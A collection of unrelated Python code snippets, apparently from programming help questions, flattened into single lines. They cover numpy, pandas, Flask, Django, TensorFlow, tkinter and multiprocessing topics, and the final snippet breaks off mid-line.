)"
"l = [ ] class A ( object ) : pass def add ( x ) : from mypackage import mymodule mymodule.l.append ( x ) print `` updated list '' , mymodule.ldef get ( ) : import mymodule return mymodule.ladd ( 1 ) print `` lets check '' , get ( ) add ( 1 ) print `` lets check again '' , get ( ) updated list [ 1 ] lets check [ ] updated list [ 1 , 1 ] lets check again [ ] def create ( ) : from mypackage import mymodule return mymodule.A ( ) def check ( a ) : import mymodule return isinstance ( a , mymodule.A ) print check ( create ( ) )"
"id labels0 1 a , b , c1 2 c , a2 3 d , a , b id a b c d 0 1 True True True False 1 2 True False True False 2 3 True True False True"
"import numpy as npnp.random.seed ( 123 ) np.set_printoptions ( linewidth=1000 , precision=3 ) arr = np.random.uniform ( -1,1 , ( 4,4 ) ) res = np.zeros ( ( 2,2 ) ) for i in xrange ( res.shape [ 0 ] ) : for j in xrange ( res.shape [ 1 ] ) : ii = i*2 jj = j*2 res [ i ] [ j ] = max ( arr [ ii ] [ jj ] , arr [ ii+1 ] [ jj ] , arr [ ii ] [ jj+1 ] , arr [ ii+1 ] [ jj+1 ] ) print arrprint res [ [ 0.393 -0.428 -0.546 0.103 ] [ 0.439 -0.154 0.962 0.37 ] [ -0.038 -0.216 -0.314 0.458 ] [ -0.123 -0.881 -0.204 0.476 ] ] [ [ 0.439 0.962 ] [ -0.038 0.476 ] ]"
"rng = pd.date_range ( '2017-01-03 ' , periods=20 , freq='8D ' ) i = pd.MultiIndex.from_product ( [ [ ' A ' , ' B ' , ' C ' ] , rng ] , names= [ 'Name ' , 'Date ' ] ) df = pd.DataFrame ( np.random.randn ( 60 ) , i , columns= [ 'Vals ' ] ) df [ 'Avg ' ] = df.groupby ( [ 'Name ' ] ) [ 'Vals ' ] .rolling ( '30D ' ) .mean ( ) # < < Why does n't this work ? df [ 'Avg ' ] = df.groupby ( [ 'Name ' ] ) [ 'Vals ' ] .rolling ( 4 ) .mean ( ) d = df.loc [ ' A ' ] d [ 'Avg ' ] = d [ 'Vals ' ] .rolling ( '30D ' ) .mean ( )"
"import time , randomimport flaskfrom flask import Flask , jsondef make_html ( ) : return `` '' '' < script src= '' http : //code.jquery.com/jquery-latest.min.js '' type= '' text/javascript '' > < /script > < script type=text/javascript > var source = new EventSource ( '/stream ' ) ; source.onmessage = function ( event ) { var data = event.data ; var logdiv = $ ( ' # log ' ) ; logdiv.empty ( ) ; logdiv.append ( ' < div class= '' event '' > ' + data + ' < /div > ' ) ; } ; < /script > < h1 > Log < /h1 > < div id=log > Log ... < /div > < hr / > `` '' '' # -- -- Flask app -- -- app = Flask ( __name__ ) @ app.route ( '/ ' ) def index ( ) : return make_html ( ) counter = 0def eventgen ( ) : global counter counter += 1 local_id = counter msg_count = 0 while True : msg_count += 1 data = { 'msg ' : msg_count , 'content ' : random.random ( ) , 'local_id ' : local_id } data = json.dumps ( data ) yield 'data : ' + data + '\n\n ' print local_id , ' : ' , data time.sleep ( 0.5 ) @ app.route ( '/stream ' ) def eventstream ( ) : return flask.Response ( eventgen ( ) , mimetype= '' text/event-stream '' ) if __name__ == '__main__ ' : app.run ( threaded=True )"
threads = [ thread for thread in threads if thread.is_alive ( ) ] alive_threads = list ( ) for thread in threads : if thread.is_alive ( ) : alive_threads.append ( thread ) else : thread.join ( ) threads = alive_threads
# No data in this file # ! /usr/bin/env pythonprint 'Loading module.py'import signal # ! /usr/bin/env pythonprint 'Loading signal.py ' $ ./module.pyLoading module.py $ ./module.pyLoading module.pyLoading signal.py [ 10:30pm ] [ ~/test ] tree ..| -- package| | -- __init__.py| | -- module.py| ` -- signal.py ` -- script [ 10:30pm ] [ ~/test ] cat script # ! /usr/bin/env pythonfrom package import signal [ 10:30pm ] [ ~/test ] cat package/__init__.py [ 10:30pm ] [ ~/test ] cat package/module.py # ! /usr/bin/env pythonprint `` Loading module.py '' import signal [ 10:30pm ] [ ~/test ] cat package/signal.py # ! /usr/bin/env pythonprint `` Loading signal.py '' [ 10:30pm ] [ ~/test ] python ./scriptLoading signal.py [ 10:32pm ] [ ~/test ] python ./package/module.py Loading module.py [ 10:32pm ] [ ~/test ] python -m package.modulepython : module package.module not found
"INSTALLED_APPS = [ # 'django.contrib.admin ' , 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'timecapture ' , 'timesheet ' ] AUTH_USER_MODEL = 'timecapture.TimeUser ' from django.contrib.auth.models import ( BaseUserManager , AbstractBaseUser ) from django.utils.translation import ugettext_lazy as _from django.db import modelsfrom django.utils import timezoneclass TimeUserManager ( BaseUserManager ) : use_in_migrations = True def create_user ( self , email , password=None ) : `` '' '' Creates and saves a User with the given email , date of birth and password. `` '' '' if not email : raise ValueError ( 'Users must have an email address ' ) user = self.model ( email=self.normalize_email ( email ) , ) user.set_password ( password ) user.save ( using=self._db ) return user def create_superuser ( self , email , password ) : `` '' '' Creates and saves a superuser with the given email , date of birth and password. `` '' '' user = self.create_user ( email , password=password , ) user.is_staff = True user.save ( using=self._db ) return user class TimeUser ( AbstractBaseUser ) : email = models.EmailField ( verbose_name='email address ' , max_length=255 , unique=True , ) is_active = models.BooleanField ( _ ( 'active ' ) , default=True , help_text=_ ( 'Designates whether this user should be treated as active . ' 'Unselect this instead of deleting accounts . ' ) , ) date_joined = models.DateTimeField ( _ ( 'date joined ' ) , default=timezone.now ) first_name = models.CharField ( _ ( 'first name ' ) , max_length=30 , blank=True ) last_name = models.CharField ( _ ( 'last name ' ) , max_length=30 , blank=True ) is_staff = models.BooleanField ( _ ( 'staff status ' ) , default=False , help_text=_ ( 'Designates whether the user can log into this admin site . ' ) , ) date_of_birth = models.DateField ( ) objects = TimeUserManager ( ) USERNAME_FIELD = 'email ' class Meta : verbose_name = _ ( 'TimeUser ' ) verbose_name_plural = _ ( 'TimeUsers ' ) abstract = False db_table = 'timeuser ' app_label = 'timecapture ' def get_full_name ( self ) : `` '' '' Returns the first_name plus the last_name , with a space in between. `` '' '' full_name = ' % s % s ' % ( self.first_name , self.last_name ) return full_name.strip ( ) def get_short_name ( self ) : `` Returns the short name for the user . '' return self.first_name def __str__ ( self ) : return self.email def has_perm ( self , perm , obj=None ) : `` Does the user have a specific permission ? '' # Simplest possible answer : Yes , always return True def has_module_perms ( self , app_label ) : `` Does the user have permissions to view the app ` app_label ` ? '' # Simplest possible answer : Yes , always return True def email_user ( self , subject , message , from_email=None , **kwargs ) : `` '' '' Sends an email to this User. `` '' '' send_mail ( subject , message , from_email , [ self.email ] , **kwargs ) @ property def is_staff ( self ) : `` Is the user a member of staff ? '' # Simplest possible answer : All admins are staff return self.is_staff | Tables_in_timecapture |+ -- -- -- -- -- -- -- -- -- -- -- -- +| auth_group || auth_group_permissions || auth_permission || django_content_type || django_migrations || django_session | django.db.utils.ProgrammingError : ( 1146 , `` Table 'timecapture.timeuser ' does n't exist '' )"
"fig = plt.figure ( ) ax = fig.add_subplot ( 111 , projection='3d ' ) rows = np.arange ( 200,1300,10 ) hist , xedges , yedges = np.histogram2d ( pm1_n , pm2_n , bins = ( rows , rows ) ) elements = ( len ( xedges ) - 1 ) * ( len ( yedges ) - 1 ) xpos , ypos = np.meshgrid ( xedges [ : -1 ] , yedges [ : -1 ] ) xpos = xpos.flatten ( ) ypos = ypos.flatten ( ) zpos = np.zeros ( elements ) dx = 0.1 * np.ones_like ( zpos ) dy = dx.copy ( ) dz = hist.flatten ( ) # # # # # The problem is here # # # # # # ax.contourf ( xpos , ypos , hist ) # ax.bar3d ( xpos , ypos , zpos , dx , dy , dz , zsort='average ' ) plt.show ( )"
B.T.dot ( A.T ) .T
IDs Timestamp Values124 300.6 1.23124 350.1 -2.4309 300.6 10.312 123.4 9.0018 350.1 2.11309 350.1 8.3 ... table [ table.IDs == 124 ] table [ ( table.IDs == 124 ) | ( table.IDs == 309 ) ] # id_list : a list of 10 IDstable [ table.IDs in id_list ] table [ ( table.IDs == id_list [ 0 ] ) | ( table.IDs == id_list [ 1 ] ) | ( table.IDs == id_list [ 2 ] ) | ( table.IDs == id_list [ 3 ] ) | ( table.IDs == id_list [ 4 ] ) | ( table.IDs == id_list [ 5 ] ) | ( table.IDs == id_list [ 6 ] ) | ( table.IDs == id_list [ 7 ] ) | ( table.IDs == id_list [ 8 ] ) | ( table.IDs == id_list [ 9 ] ) ]
"df1.head ( ) = wght num_links id_y id_x 3 133 0.000203 2 186 0.000203 2 5 6 0.000203 2 98 0.000203 2 184 0.000203 2 thr = N* ( N-1 ) *2 , ipdb > df1 [ 'wght ' ] .count ( ) * ( df1 [ 'wght ' ] .count ( ) -1 ) *2-712569744 ipdb > df1 [ 'wght ' ] .count ( ) 137736 ipdb > 137736*137735*237942135920. ipdb > df1 [ 'wght ' ] .count ( ) 137736"
"In [ 1 ] : import h5py , numpy as npIn [ 2 ] : A = np.arange ( 5 ) In [ 3 ] : f = h5py.File ( 'test.h5 ' , ' w ' ) ; f [ ' A ' ] = A ; f.close ( ) In [ 4 ] : ! md5sum test.h57d27c258d94ed5d06736f6d2ba7c9433 test.h5In [ 5 ] : f = h5py.File ( 'test.h5 ' , ' w ' ) ; f [ ' A ' ] = A ; f.close ( ) In [ 6 ] : ! md5sum test.h5c1db5806f1393f2095c88dbb7efeb7d3 test.h5In [ 7 ] : # the file has changed but still contains the same data !"
"Class A ( object ) : def __init__ ( self , arg ) : self.arg = arg def print_arg ( self ) : print ( self.arg ) Class B ( object ) : def __init__ ( self , arg ) : self.__dict__ [ 'arg ' ] = arg def print_arg ( self ) : print ( self.arg )"
"url ( r'^things/ ( ? P < thing_name > \w+ ) /features/ ( ? P < feature_name > \w+ ) $ ' , views.thingFeature , name='thing_feature ' ) , thing = Thing.objects.get ( ... .. ) feature = thing.feature_set.first ( ) t_name = thing.namef_name = feature.name from django.core.urlresolvers import reverseurl = reverse ( 'thing_feature ' , thing_name=t_name , feature_name=f_name ) # url == '/things/thing2/features/left-arm ' url_kwarg_names = get_kwarg_names_for_url ( 'thing_feature ' ) # url_kwarg_names == [ 'thing_name ' , 'feature_name ' ] def get_kwarg_names_for_url ( url_name ) : resolver = get_resolver ( get_urlconf ( ) ) reverse_data = resolver.reverse_dict [ url_name ] pattern_list = reverse_data [ 0 ] `` ' Need to specify the 1st pattern because url regexes can potentially have multiple kwarg arrangments - this function does not take this possibility into account. `` ' first_pattern = pattern_list [ 0 ] `` ' ` first_pattern ` is now of the form ` ( url_string , kwarg_list ) ` - all we are interested in is the 2nd value. `` ' return first_pattern [ 1 ]"
eventList = ConstBitStream ( filename = 'events.dat ' ) for i in range ( 1000 ) : packet = eventList.read ( 24 )
"File `` /home/chenf/python-2.6.1/lib/python2.6/imaplib.py '' , line 890 , in _command_complete raise self.abort ( 'command : % s = > % s ' % ( name , val ) ) abort : command : SEARCH = > socket error : EOF"
import unittestclass TestNightlife ( unittest.TestCase ) : _my_param = 0 def test_a ( self ) : print 'test A = % d ' % self._my_param self._my_param = 1 def test_b ( self ) : print 'test B = % d ' % self._my_param self._my_param = 2if __name__ == `` __main__ '' : unittest.main ( ) test A = 0test B = 0
"- url : / . * script : main.py from google.appengine.ext import webappclass Page1 ( webapp.RequestHandler ) : def get ( self ) : self.response.out.write ( `` Page 1 '' ) class Page2 ( webapp.RequestHandler ) : def get ( self ) : self.response.out.write ( `` Page 2 '' ) application = webapp.WSGIApplication ( [ ( '/page1/ ' , Page1 ) , ( '/page2/ ' , Page2 ) , ] , debug=True ) def main ( ) : wsgiref.handlers.CGIHandler ( ) .run ( application ) if __name__ == '__main__ ' : main ( ) - url : /page1/ script : page1.py- url : /page2/ script : page2.py from google.appengine.ext import webappclass Page1 ( webapp.RequestHandler ) : def get ( self ) : self.response.out.write ( `` Page 1 '' ) application = webapp.WSGIApplication ( [ ( '/page1/ ' , Page1 ) , ] , debug=True ) def main ( ) : wsgiref.handlers.CGIHandler ( ) .run ( application ) if __name__ == '__main__ ' : main ( ) from google.appengine.ext import webappclass Page2 ( webapp.RequestHandler ) : def get ( self ) : self.response.out.write ( `` Page 2 '' ) application = webapp.WSGIApplication ( [ ( '/page2/ ' , Page2 ) , ] , debug=True ) def main ( ) : wsgiref.handlers.CGIHandler ( ) .run ( application ) if __name__ == '__main__ ' : main ( )"
"import requestsfrom pprint import pprintresp = requests.get ( 'https : //stackexchange.com/oauth/dialog ? client_id=6667 & scope=private_info & redirect_uri=https : //stackexchange.com/oauth/login_success/ ' ) pprint ( vars ( resp ) ) import oauth2 as oauthfrom pprint import pprinturl = 'https : //www.stackexchange.com'request_token_url = ' % s/oauth/ ' % urlaccess_token_url = ' % s/ ' % urlconsumer = oauth.Consumer ( key='mykey ' , secret='mysecret ' ) client = oauth.Client ( consumer ) response , content = client.request ( request_token_url , 'GET ' ) print ( response , content ) from requests_oauthlib import OAuth2Sessionfrom pprint import pprintclient_id = ' x'client_secret = ' x'redirect_uri = 'https : //stackexchange.com/oauth/login_success'scope = 'no_expiry'oauth = OAuth2Session ( client_id , redirect_uri=redirect_uri , scope=scope ) pprint ( vars ( oauth ) ) authorization_url , state = oauth.authorization_url ( 'https : //stackexchange.com/oauth/dialog ' ) print ( authorization_url )"
< p > The < em > best < /em > way of using the Internet isto use < a href= '' { { url_for ( 'our_site ' ) } } '' > our site < /a > . < /p > < p > { % trans % } The { % endtrans % } < em > { % trans % } best { % endtrans % } < /em > { % trans % } way of using the Internet is to use { % endtrans % } < a href= '' { { url_for ( 'our_site ' ) } } '' > { % trans % } our site { % endtrans % } < /a > { % trans % } . { % endtrans % } < /p >
"Enter first word : chickenEnter second word : fishEnter third word : zebraTrue first = ( input ( 'Enter first word : ' ) ) second = ( input ( 'Enter second word : ' ) ) third = ( input ( 'Enter third word : ' ) ) s = [ ' a ' , ' b ' , ' c ' , 'd ' , ' e ' , ' f ' , ' g ' , ' h ' , ' i ' , ' j ' , ' k ' , ' l ' , 'm ' , ' n ' , ' o ' , ' p ' , ' q ' , ' r ' , 's ' , 't ' , ' u ' , ' v ' , ' w ' , ' x ' , ' y ' , ' z ' , ' A ' , ' B ' , ' C ' , 'D ' , ' E ' , ' F ' , ' G ' , ' H ' , ' I ' , ' J ' , ' K ' , ' L ' , 'M ' , ' N ' , ' O ' , ' P ' , ' Q ' , ' R ' , 'S ' , 'T ' , ' U ' , ' V ' , ' W ' , ' Z ' , ' Y ' , ' Z ' ] if s.find ( first [ 0 ] ) > s.find ( second [ 0 ] ) and s.find ( second [ 0 ] ) > s.find ( third [ 0 ] ) : print ( True )"
"> > > c = t.concordance ( 'president ' ) Displaying 25 of 142 matches : of Hays , Kan. as the school 's new president . Dr. Clark will succeed Dr. J. R. dollars , said C. Virgil Martin , president of Carson Pirie Scott & Co. , commdants `` . Washington , July 24 -- president Kennedy today pushed aside other Wionwide television and radio . The president spent much of the week-end at his drafts `` . Salinger said the work president Kennedy , advisers , and members omiss them . Washington , Feb. 9 -- president Kennedy today proposed a mammoth nrailroad retirement programs . The president , in a special message to Congressged care plan , similar to one the president sponsored last year as a senator , or up to 240 days an illness . The president noted that Congress last year passe medical and dental schools . The president said the nation 's 92 medical and 4go up to 21 millions by 1966 . The president recommended federal `` matching grcommunity health services `` , the president called for doubling the present 10 . In the child health field , the president said he will recommend later an innstitute . Asks research funds The president said he will ask Congress to increbuilding research facilities . The president said he will also propose increasiernment research in medicine . The president said his proposals combine the `` e ( D. , Ore. ) in connection with president Eisenhower 's cabinet selections inr 's cabinet selections in 1953 and president Kennedy 's in 1961 . Oslo The most e was critical of what he feels is president Kennedy 's tendency to be too concication . But he did recommend that president Kennedy state clearly that if Comm any observer would have said that president Kennedy had blended a program thatnquency in the United States . The president is deeply concerned over this proborities on juvenile problems . The president asks the support and cooperation orime trend . Offenses multiply The president has also called upon the Attorney h the problem . Simultaneously the president announced Thursday the appointment > > > print cNone"
"_keys_to_map = { 'd ' : tf.FixedLenFeature ( [ ] , tf.string ) , # data 's ' : tf.FixedLenFeature ( [ ] , tf.int64 ) , # score } def _parser ( record ) : ] [ 3 ] parsed = tf.parse_single_example ( record , _keys_to_map ) return parsed [ 'd ' ] , parsed [ 's ' ] def init_tfrecord_dataset ( ) : files_train = glob.glob ( DIR_TFRECORDS + '*.tfrecord ' ) random.shuffle ( files_train ) with tf.name_scope ( 'tfr_iterator ' ) : ds = tf.data.TFRecordDataset ( files_train ) # define data from randomly ordered files ds = ds.shuffle ( buffer_size=10000 ) # select elements randomly from the buffer ds = ds.map ( _parser ) # map them based on tfrecord format ds = ds.batch ( BATCH_SIZE , drop_remainder=True ) # group elements in batch ( remove batch of less than BATCH_SIZE ) ds = ds.repeat ( ) # iterate infinitely return ds.make_initializable_iterator ( ) # initialize the iteratordef iterator_to_data ( iterator ) : `` '' '' Creates a part of the graph which reads the raw data from an iterator and transforms it to a data ready to be passed to model . Args : iterator - iterator . Created by ` init_tfrecord_dataset ` Returns : data_board - ( BATCH_SIZE , 8 , 8 , 24 ) you can think about as NWHC for images . data_flags - ( BATCH_SIZE , 10 ) combined_score - ( BATCH_SIZE , ) `` '' '' b = tf.constant ( ( 128 , 64 , 32 , 16 , 8 , 4 , 2 , 1 ) , dtype=tf.uint8 , name='unpacked_const ' ) with tf.name_scope ( 'tfr_parse ' ) : with tf.name_scope ( 'packed_data ' ) : next_element = iterator.get_next ( ) data_packed , score_int = next_element score = tf.cast ( score_int , tf.float64 , name='score_float ' ) # https : //stackoverflow.com/q/45454470/1090562 with tf.name_scope ( 'data_unpacked ' ) : data_unpacked = tf.reshape ( tf.mod ( tf.to_int32 ( tf.decode_raw ( data_packed , tf.uint8 ) [ : , : ,None ] // b ) , 2 ) , [ BATCH_SIZE , 1552 ] , name='data_unpack ' ) with tf.name_scope ( 'score ' ) : with tf.name_scope ( 'is_mate ' ) : score_is_mate = tf.cast ( tf.squeeze ( tf.slice ( data_unpacked , [ 0 , 1546 ] , [ BATCH_SIZE , 1 ] ) ) , tf.float64 , name='is_mate ' ) with tf.name_scope ( 'combined ' ) : combined_score = ( 1 - score_is_mate ) * VALUE_A * tf.tanh ( score / VALUE_K ) + score_is_mate * tf.sign ( score ) * ( VALUE_A + ( 1 - VALUE_A ) / ( VALUE_B - 1 ) * tf.reduce_max ( tf.stack ( [ tf.zeros ( BATCH_SIZE , dtype=tf.float64 ) , VALUE_B - tf.abs ( score ) ] ) , axis=0 ) ) with tf.name_scope ( 'board ' ) : with tf.name_scope ( 'reshape_layers ' ) : data_board = tf.reshape ( tf.slice ( data_unpacked , [ 0 , 0 ] , [ BATCH_SIZE , 8 * 8 * 24 ] ) , [ BATCH_SIZE , 8 , 8 , 24 ] , name='board_reshape ' ) with tf.name_scope ( 'combine_layers ' ) : data_board = tf.cast ( tf.stack ( [ data_board [ : , : , : , 0 ] , data_board [ : , : , : , 4 ] , data_board [ : , : , : , 8 ] , data_board [ : , : , : ,12 ] , data_board [ : , : , : ,16 ] , data_board [ : , : , : ,20 ] , - data_board [ : , : , : , 1 ] , - data_board [ : , : , : , 5 ] , - data_board [ : , : , : , 9 ] , - data_board [ : , : , : ,13 ] , - data_board [ : , : , : ,17 ] , - data_board [ : , : , : ,21 ] , data_board [ : , : , : , 2 ] , data_board [ : , : , : , 6 ] , data_board [ : , : , : ,10 ] , data_board [ : , : , : ,14 ] , data_board [ : , : , : ,18 ] , data_board [ : , : , : ,22 ] , - data_board [ : , : , : , 3 ] , - data_board [ : , : , : , 7 ] , - data_board [ : , : , : ,11 ] , - data_board [ : , : , : ,15 ] , - data_board [ : , : , : ,19 ] , - data_board [ : , : , : ,23 ] , ] , axis=3 ) , tf.float64 , name='board_compact ' ) with tf.name_scope ( 'flags ' ) : data_flags = tf.cast ( tf.slice ( data_unpacked , [ 0 , 1536 ] , [ BATCH_SIZE , 10 ] ) , tf.float64 , name='flags ' ) return data_board , data_flags , combined_score"
"str = `` Academy \nADDITIONAL\nAwards and Recognition : Greek Man of the Year 2011 Stanford PanHellenic Community , American Delegate 2010 Global\nEngagement Summit , Honorary Speaker 2010 SELA Convention , Semi-Finalist 2010 Strauss Foundation Scholarship Program\nComputer Skills : Competency : MATLAB , MySQL/PHP , JavaScript , Objective-C , Git Proficiency : Adobe Creative Suite , Excel\n ( highly advanced ) , PowerPoint , HTML5/CSS3\nLanguages : Fluent English , Advanced Spanish\n\x0c '' regex = r ' ( ? < =\n ( ADDITIONAL|Additional ) \n ) [ \s\S ] + ? ( ? =\n ( Languages|LANGUAGES ) \n* ) '"
from xml.dom import minidom document = minidom.parse ( `` beispiel.xml '' ) wanted_info = input ( `` Which prduct do you want to see ? '' ) product_list = document.getElementsByTagName ( wanted_info ) for product in product_list : for value in product.childNodes : if value.nodeType == minidom.Node.ELEMENT_NODE : print ( value.tagName + `` : '' + value.firstChild.data ) print ( `` \n '' )
"l1 = [ 3,4,7 , -2 ] l2 = [ 0.5,3,6,2.7 ] l3 = [ 0,5,8,3.6 ] mat = [ l1 , l2 , l3 ] result = maximize ( func , mat ) def func ( mat ) : # doing some math between lists . For Example : sum_list = list ( mat [ 0 ] ) for li in mat [ 1 : ] : sum_list = map ( operator.add , sum_list , li ) accum_min_lst = [ ] for i , val in enumerate ( sum_list ) : x = sum_list [ : i + 1 ] accum_min_lst.append ( val - max ( x ) ) return min ( accum_min_lst ) [ l1 ] , [ l2 ] , [ l3 ] , [ l1 , l2 ] , [ l1 , l3 ] , [ l2 , l3 ] , [ l1 , l2 , l3 ]"
"pts = np.array ( [ [ 1 , 1 , 1 ] , [ 2 , 2 , 2 ] , [ 3 , 3 , 3 ] , [ 4 , 4 , 4 ] , [ 5 , 5 , 5 ] , ] ) pts [ 0 ] = np.dot ( transform_matrix , pts [ 0 ] ) pts [ 1 ] = np.dot ( transform_matrix , pts [ 1 ] ) …pts [ n ] = np.dot ( transform_matrix , pts [ n ] )"
"from tkinter.filedialog import askopenfilefile = askopenfile ( ) import tkinter as tktk.Tk ( ) .withdraw ( ) import tkinter as tkimport os , psutilprocess = psutil.Process ( os.getpid ( ) ) def mem ( ) : print ( f ' { process.memory_info ( ) .rss : , } ' ) # initial memory usagemem ( ) # 21,475,328for i in range ( 20 ) : root.append ( tk.Tk ( ) ) root [ -1 ] .destroy ( ) mem ( ) # 24,952,832 # 26,251,264 # ... # 47,591,424 # 48,865,280 # try deleting the root insteaddel rootmem ( ) # 50,819,072 class Foo ( ) : def __init__ ( self ) : # create a list that takes up approximately the same size as a Tk ( ) on average self.lst = list ( range ( 11500 ) ) for i in range ( 20 ) : root.append ( Foo ( ) ) del root [ -1 ] mem ( ) # 52,162,560 # 52,162,560 # ... # 52,162,560 # Force garbage collectionimport gcgc.collect ( ) # quit ( ) methodroot.quit ( ) # delete the entire tkinter referencedel tk"
print ( __name__ )
"ROIWidgets/ MANIFEST.in setup.py setup.cfg ROIWidgets/ __init__.py static/ widgets/ js - > < symlink to folder containing JavaScript files > recursive-include static * warning : no files found matching '* ' under directory 'static ' def findall ( dir = os.curdir ) : `` '' '' Find all files under 'dir ' and return the list of full filenames ( relative to 'dir ' ) . `` '' '' all_files = [ ] for base , dirs , files in os.walk ( dir ) : if base==os.curdir or base.startswith ( os.curdir+os.sep ) : base = base [ 2 : ] if base : files = [ os.path.join ( base , f ) for f in files ] all_files.extend ( filter ( os.path.isfile , files ) ) return all_filesdistutils.filelist.findall = findall # fix findall bug in distutils ."
"/usr/local/lib/python3.5/site-packages/IPython/core/interactiveshell.py:440 : UserWarning : As of IPython 5.0 ` PromptManager ` config will have no effect and has been replaced by TerminalInteractiveShell.prompts_classwarn ( 'As of IPython 5.0 ` PromptManager ` config will have no effect ' class MyPrompt ( Prompts ) : def in_prompt_tokens ( self , cli=None ) : return [ ( Token , os.getcwd ( ) ) , ( Token.Prompt , ' > > > ' ) ]"
"from sklearn import linear_modelimport numpy as npA = np.array ( [ [ 1 , 0 ] , [ 0 , 1 ] ] ) b = np.array ( [ 1 , 0 ] ) x , _ , _ , _ = np.linalg.lstsq ( A , b ) xOut [ 1 ] : array ( [ 1. , 0 . ] ) clf = linear_model.LinearRegression ( ) clf.fit ( A , b ) coef = clf.coef_coefOut [ 2 ] : array ( [ 0.5 , -0.5 ] )"
"import numpy as npc = np.array ( [ [ [ 75 , 763 ] ] , [ [ 57 , 763 ] ] , [ [ 57 , 749 ] ] , [ [ 75 , 749 ] ] ] ) CNTS = [ np.array ( [ [ [ 78 , 1202 ] ] , [ [ 63 , 1202 ] ] , [ [ 63 , 1187 ] ] , [ [ 78 , 1187 ] ] ] ) , np.array ( [ [ [ 75 , 763 ] ] , [ [ 57 , 763 ] ] , [ [ 57 , 749 ] ] , [ [ 75 , 749 ] ] ] ) , np.array ( [ [ [ 72 , 742 ] ] , [ [ 58 , 742 ] ] , [ [ 57 , 741 ] ] , [ [ 57 , 727 ] ] , [ [ 58 , 726 ] ] , [ [ 72 , 726 ] ] ] ) , np.array ( [ [ [ 66 , 194 ] ] , [ [ 51 , 194 ] ] , [ [ 51 , 179 ] ] , [ [ 66 , 179 ] ] ] ) ] print ( c in CNTS ) CNTS.remove ( c )"
"m | r -- -- | -- -- -- 2.0 | 3.30.8 | | 4.01.3 | 2.1 | 5.2 | 2.3 | 1.92.5 | 1.2 | 3.02.0 | 2.6 clear all ; m = xlsread ( 'data.xlsx ' , 'A2 : A11 ' ) ; r = xlsread ( 'data.xlsx ' , 'B2 : B11 ' ) ; rho = corr ( m , r , 'rows ' , 'pairwise ' ) ; x0 = [ 1,1,1,1,1,1 ] ; lb = [ 0,0,0,0,0,0 ] ; f = @ ( x ) my_correl ( x , rho ) ; SOL = fmincon ( f , x0 , [ ] , [ ] , [ ] , [ ] , lb ) function X = my_correl ( x , rho ) sum_m = ( 11.9 + x ( 1 ) + x ( 2 ) + x ( 3 ) ) ; sum_r = ( 22.3 + x ( 1 ) + x ( 2 ) + x ( 3 ) ) ; avg_m = ( 11.9 + x ( 1 ) + x ( 2 ) + x ( 3 ) ) /8 ; avg_r = ( 22.3 + x ( 4 ) + x ( 5 ) + x ( 6 ) ) /8 ; rho_num = 8* ( 26.32 + 4*x ( 1 ) + 2.3*x ( 2 ) + 1.9*x ( 3 ) + 0.8*x ( 4 ) + 1.3*x ( 5 ) + 2.5*x ( 6 ) ) - sum_m*sum_r ; rho_den = sqrt ( 8* ( 22.43 + ( 4*x ( 1 ) ) ^2 + ( 2.3*x ( 2 ) ) ^2 + ( 1.9*x ( 3 ) ) ^2 ) - sum_m^2 ) *sqrt ( 8* ( 78.6 + ( 0.8*x ( 4 ) ) ^2 + ( 1.3*x ( 5 ) ) ^ + ( 2.5*x ( 6 ) ) ^2 ) - sum_r^2 ) ; X = ( rho - rho_num/rho_den ) ^2 ; end"
"x = np.ndarray ( shape= ( 10 , 7 , 5 ) , dtype = float ) y = np.ndarray ( shape= ( 7 , 5 ) , dtype = float ) for a in range ( 10 ) : for b in range ( 7 ) : for b in range ( 5 ) : result [ a , b , c ] = x [ a , b , c ] + y [ b , c ] for a in range ( 10 ) : for b in range ( 7 ) : for b in range ( 5 ) : result [ a , b , c ] = x [ a , b , c ] + y [ a , c ] ^ z = np.einsum ( 'ij , k- > ikj ' , y , np.ones ( 7 ) ) x + z"
"def stream ( self , records ) : # type ( records ) = < type 'generator ' > for record in records : # record = OrderedDict ( [ ( '_time ' , '1518287568 ' ) , ( 'data ' , '5552267792 ' ) ] ) output = rest_api_lookup ( record [ self.input_field ] ) record.update ( output ) yield record"
"SimpleTestCase.assertRedirects ( response , expected_url , status_code=302 , target_status_code=200 , host=None , msg_prefix= '' , fetch_redirect_response=True ) @ pytest.mark.django_dbdef test_redirection_to_home_when_group_does_not_exist ( create_social_user ) : `` '' '' Some docstring defining what the test is checking . '' '' '' c = Client ( ) c.login ( username='TEST_USERNAME ' , password='TEST_PASSWORD ' ) response = c.get ( reverse ( 'pledges : home_group ' , kwargs= { 'group_id ' : 100 } ) , follow=True ) SimpleTestCase.assertRedirects ( response , reverse ( 'pledges : home ' ) ) SimpleTestCase.assertRedirects ( response , reverse ( 'pledges : home ' ) )"
"import osimport multiprocessing as mpimport signalfrom collections import namedtupleimport uuidimport logging_CALLBACKS = { } _QUEUE = mp.Queue ( ) info = logging.getLogger ( __name__ ) .infoclass Call ( namedtuple ( 'Call ' , 'id finished result error ' ) ) : def attach ( self , func ) : if not self.finished : _CALLBACKS.setdefault ( self.id , [ ] ) .append ( func ) else : func ( self.result or self.error ) return self def callback ( self ) : assert self.finished , 'Call not finished yet ' r = self.result or self.error for func in _CALLBACKS.pop ( self.id , [ ] ) : func ( r ) def done ( self , result=None , error=None ) : assert not self.finished , 'Call already finished ' return self._replace ( finished= ( -1 if error else 1 ) , result=result , error=error ) @ classmethod def create ( clss ) : call = clss ( uuid.uuid4 ( ) .hex , 0 , None , None ) # uuid ? ? ? return calldef run ( q , cb , func , args=None , kwargs=None ) : info ( 'run : try running % s ' % func ) try : cb = cb.done ( result=func ( * ( args or ( ) ) , ** ( kwargs or { } ) ) ) except Exception , err : cb = cb.done ( error=err ) q.put ( cb ) os.kill ( os.getppid ( ) , signal.SIGUSR2 ) # SIGUSR2 ? ? ? info ( 'run : leaving ' ) def on_callback ( sig , frame ) : info ( 'on_callback : checking queue ... ' ) c = _QUEUE.get ( True , 2 ) info ( 'on_callback : got call - % s ' % repr ( c ) ) c.callback ( ) signal.signal ( signal.SIGUSR2 , on_callback ) # SIGUSR2 ? ? ? def delegate ( func , *args , **kwargs ) : info ( 'delegate : % s % s ' % ( func , args , ) ) cb = Call.create ( ) mp.Process ( target=run , args= ( _QUEUE , cb , func , args , kwargs , ) ) .start ( ) return cb__all__ = [ 'delegate ' ] from delegate import delegatedef sleeper ( secs ) : assert secs > = 1 , ' I need my Augenpflege ' info ( 'sleeper : will go to sleep for % s secs ' % secs ) sleep ( secs ) info ( 'sleeper 